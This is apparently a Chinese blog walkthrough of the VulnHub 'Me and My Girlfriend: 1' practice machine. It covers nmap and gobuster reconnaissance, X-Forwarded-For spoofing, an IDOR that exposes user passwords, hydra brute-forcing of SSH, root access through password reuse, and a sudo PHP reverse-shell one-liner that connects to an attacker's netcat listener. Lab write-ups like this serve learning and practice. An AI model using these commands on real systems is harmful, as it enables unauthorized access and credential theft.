---
title: "Me and My Girlfriend: 1-Vulnhub Walkthrough"
categories: [ "安全技术" ]
tags: [ "vulnhub","靶机","walkthrough" ]
draft: false
slug: "502"
date: "2020-02-13 21:28:00"
---

[靶机地址][1]

此靶机具有双`flag`，普通用户一个，`root`用户一个

## 工具及漏洞信息

- netdiscover
- nmap
- gobuster
- hydra
- x-forwarded-for 本地访问
- 水平越权
- mysql 密码可能就是 root 密码

## 0x01 信息收集

### 扫描靶机

`netdiscover`的`-r`参数扫描`192.168.1.0/16`结果如下：

![][2]

`nmap`扫描主机及端口信息：

```
nmap -sS -A -n -T4 -p- 192.168.1.12
```

![][3]

可以看到只开启了`ssh`和`web`80 端口

### 扫描路径

虽然大部分情况下不需要扫描路径，但是做工作做全套

`gobuster`扫描路径：

```
gobuster dir -u http://192.168.1.12 -s 200,301,302 -t 50 -q -w /usr/share/seclists/Discovery/Web-Content/big.txt
```

![][4]

看来是没啥了，只有`robots.txt`必须每次要看一下，得到文件路径`heyhoo.txt`

得到了不痛不痒的提示：

```
Great! What you need now is reconn, attack and got the shell。
```

访问首页如下：

![][5]

提示只能从本地访问，`ctf`中的入门问题：`x-forwarded-for`需要改为`127.0.0.1`表示来自本地的访问

多种方法可用，抓包也行，插件更多：`Header Editor`，`X-Forwarded-For Header`

我这里使用`X-Forwarded-For Header`:

![][6]

## 0x02 普通账户 shell

进入首页：

![][7]

尝试登录弱口令无效，那我们注册一个账号:

![][8]

登录后链接变为；

```
http://192.168.1.12/index.php?page=dashboard&user_id=12
```

看到这个`user_id=xxx`就想把它改为 1，用户名密码发生了改变：

![][9]

通过`firefox`网页源代码查看功能，发现把密码隐藏框的属性`type`由`password`改为其他任意的就可以查看密码：

![][10]

存在水平越权，又能查看密码，那我们就把整个数据库的账户密码存下来

前面端口扫描的时候，记得除了`80`还有一个`22`的`ssh`登录

使用`hydra`和我们爆破出的账户密码来爆破`ssh`服务：

```
hydra -L user.txt -P passwd.txt -t 4 -I ssh://192.168.1.12
```

- -t:4 每个目标并行连接的任务数，因为`ssh`很容易被测试崩
- -I 表示跳过烦人的等待时间

![][11]

爆破成功，获得`ssh`的账号密码：`alice/4lic3`，登陆之

## 0x03 提权 root

登录后第一步查看当前目录：`ls -al`

![][12]

在`.my_secret`目录下获得第一个`flag`

我们在扫描网站路径时除了`robots.txt`好像还有点其他东西，于是进入网站根目录看一下：

```
cd /var/www/html
```

`config`目录里是一个配置文件，内容为`mysql`的链接:

![][13]

尝试连接`sql`数据库查看信息:

![][14]

指定配置文件中给出的数据库，查看内容：

![][15]

只是网站上的用户的数据库，没什么可用的

正当我觉得没用的时候，突然想到万一这不仅仅是数据库的密码呢？

退出数据库，切换`root`用户:`su root`,输入数据库的密码:

![][16]

进去了!WTF?

![][17]

## 0x04 换种方法提权 root

不行啊，这也太没技术含量了，这不就是查看目录的操作吗？

下面我们再换一种没有技术含量的方法::quyin:1huaji::

现在`kali`上监听`nc -lvp 3333`

靶机上`php`反弹`shell`:

```
sudo /usr/bin/php -r '$sock=fsockopen("192.168.1.2",3333);exec("/bin/sh -i <&3 >&3 2>&3");'
```

![][18]

参考文章：

- [vulnhub 之 Me-and-My-Girlfriend-1 实战][19]
- [特权升级获取 flag 的详细过程及思路][20]
- [VulnHub 靶机系列实战教程][21]

本文完。

[1]: https://www.vulnhub.com/entry/me-and-my-girlfriend-1,409/
[2]: https://img.soapffz.com/archives_img/2020/02/13/archives_20200213_212847.png
[3]: https://img.soapffz.com/archives_img/2020/02/13/archives_20200213_212928.png
[4]: https://img.soapffz.com/archives_img/2020/02/13/archives_20200213_214204.png
[5]: https://img.soapffz.com/archives_img/2020/02/13/archives_20200213_213226.png
[6]: https://img.soapffz.com/archives_img/2020/02/13/archives_20200213_213557.png
[7]: https://img.soapffz.com/archives_img/2020/02/13/archives_20200213_213817.png
[8]: https://img.soapffz.com/archives_img/2020/02/13/archives_20200213_214511.png
[9]: https://img.soapffz.com/archives_img/2020/02/13/archives_20200213_214911.png
[10]: https://img.soapffz.com/archives_img/2020/02/13/archives_20200213_215028.png
[11]: https://img.soapffz.com/archives_img/2020/02/13/archives_20200213_220715.png
[12]: https://img.soapffz.com/archives_img/2020/02/13/archives_20200213_221116.png
[13]: https://img.soapffz.com/archives_img/2020/02/13/archives_20200214_101438.png
[14]: https://img.soapffz.com/archives_img/2020/02/13/archives_20200214_102100.png
[15]: https://img.soapffz.com/archives_img/2020/02/13/archives_20200214_102138.png
[16]: https://img.soapffz.com/archives_img/2020/02/13/archives_20200214_102452.png
[17]: https://img.soapffz.com/archives_img/2020/02/13/archives_20200214_102550.png
[18]: https://img.soapffz.com/archives_img/2020/02/13/archives_20200214_103315.png
[19]: https://mp.weixin.qq.com/s/dXc9QHMt26Tcck0YyW9Kog
[20]: https://mp.weixin.qq.com/s/zPX29w8cDEcm66HY9qBRyg
[21]: https://mp.weixin.qq.com/s/skCNWPiEPgJcHXSmsif5qQ